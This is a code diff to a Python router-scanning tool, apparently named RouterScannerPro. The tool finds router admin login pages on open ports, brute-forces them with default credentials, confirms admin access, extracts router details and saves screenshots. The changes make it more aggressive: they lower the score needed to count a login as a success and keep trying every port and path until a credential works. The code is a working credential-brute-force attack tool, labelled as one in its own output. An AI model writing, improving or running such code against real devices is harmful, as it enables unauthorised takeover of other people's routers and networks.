@@ -847,8 +847,18 @@ class RouterScannerPro:
             if login_page_score >= 3:
                 score -= 3
 
-            # Only return True if score is high enough (conservative approach)
-            if score >= 5:
+            # More lenient scoring - adjust threshold based on content length and indicators
+            min_score = 3  # Lower threshold for basic admin access
+            
+            # If we have strong positive indicators, be more lenient
+            if any(k in content for k in ['logout', 'sign out', 'log out']) or any('session' in c.lower() or 'auth' in c.lower() for c in s.cookies.keys()):
+                min_score = 2
+            
+            # If we have admin indicators and moved away from login page, be even more lenient
+            if score >= 2 and not any(k in final_url for k in ["login", "sign-in", "signin", "auth", "authentication"]):
+                min_score = 2
+            
+            if score >= min_score:
                 return True, self.extract_router_info(content)
             else:
                 return False, {}
@@ -1097,14 +1107,15 @@ class RouterScannerPro:
             # Get priority paths based on brand
             priority_paths = brand_patterns['paths'] + BRAND_PATTERNS['generic']['paths']
             
-            # Test all ports with priority paths
-            login_found = False
+            # Test all ports with priority paths - continue until vulnerability found
+            vulnerability_found = False
+            
             for port in open_ports:
-                if not running or login_found:
+                if not running or vulnerability_found:
                     break
                 
                 for path in priority_paths:
-                    if not running or login_found:
+                    if not running or vulnerability_found:
                         break
                     
                     url = f"http://{ip}:{port}{path}"
@@ -1123,14 +1134,12 @@ class RouterScannerPro:
                             'brand': brand
                         }
                         result['login_pages'].append(login_info)
-                        login_found = True
                         
                         # Phase 3: Brute force attack
                         print(f"{Colors.YELLOW}[3/4] Brute Force Attack...{Colors.END}")
                         
-                        credential_found = False
                         for username, password in TARGET_CREDENTIALS:
-                            if not running or credential_found:
+                            if not running or vulnerability_found:
                                 break
                             
                             print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}")
@@ -1139,20 +1148,19 @@ class RouterScannerPro:
                             
                             if success:
                                 # Phase 4: Admin verification & information extraction
-                                print(f"{Colors.YELLOW}[4/4] Admin Verification & Information Extraction...{Colors.END}")
-                                
                                 verified, router_info = self.verify_admin_access(admin_url, username, password, auth_type)
                                 
                                 if verified:
                                     # Only print VULNERABLE messages after successful verification
                                     print(f"{Colors.RED}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                                     print(f"{Colors.GREEN}[+] Admin URL: {admin_url}{Colors.END}")
-                                    print(f"{Colors.GREEN}[+] Admin access verified!{Colors.END}")
                                     
                                     # Display extracted information
-                                    for key, value in router_info.items():
-                                        if value and value != "Unknown":
-                                            print(f"{Colors.MAGENTA}[+] {key.replace('_', ' ').title()}: {value}{Colors.END}")
+                                    if router_info:
+                                        print(f"{Colors.YELLOW}[4/4] Information Extraction...{Colors.END}")
+                                        for key, value in router_info.items():
+                                            if value and value != "Unknown":
+                                                print(f"{Colors.MAGENTA}[+] {key.replace('_', ' ').title()}: {value}{Colors.END}")
                                     
                                     # Take screenshot for POC
                                     screenshot_file = None
@@ -1161,8 +1169,6 @@ class RouterScannerPro:
                                         screenshot_file = self.take_screenshot(admin_url, username, password, auth_type, ip)
                                         if screenshot_file:
                                             print(f"{Colors.GREEN}[+] Screenshot saved: {screenshot_file}{Colors.END}")
-                                    else:
-                                        print(f"{Colors.YELLOW}[*] Screenshot disabled{Colors.END}")
                                     
                                     vulnerability = {
                                         'type': 'Default Credentials',
@@ -1178,20 +1184,24 @@ class RouterScannerPro:
                                     with self.lock:
                                         stats['vulnerable_routers'] += 1
                                     
-                                    credential_found = True  # Stop testing other credentials
+                                    vulnerability_found = True  # Stop testing other credentials and ports
                                     break  # Exit the credential loop
                                 else:
-                                    print(f"{Colors.RED}[-] Admin access verification failed{Colors.END}")
+                                    print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
                             else:
                                 print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
                         
-                        # Only show "No valid credentials found" if no vulnerabilities were found
-                        if not result['vulnerabilities']:
-                            print(f"{Colors.RED}[-] No valid credentials found{Colors.END}")
-                        
-                        break  # Stop testing other paths once login page is found
+                        # If no vulnerability found on this port/path, continue to next
+                        if not vulnerability_found:
+                            continue
+                        else:
+                            break  # Exit path loop if vulnerability found
                     elif auth_type and auth_type.startswith('false_positive'):
                         print(f"{Colors.YELLOW}[!] False positive detected: {auth_type.replace('false_positive_', '')}{Colors.END}")
+            
+            # Only show "No valid credentials found" if no vulnerabilities were found across all ports
+            if not result['vulnerabilities']:
+                print(f"{Colors.RED}[-] No valid credentials found{Colors.END}")
             
             # Update stats
             with self.lock:
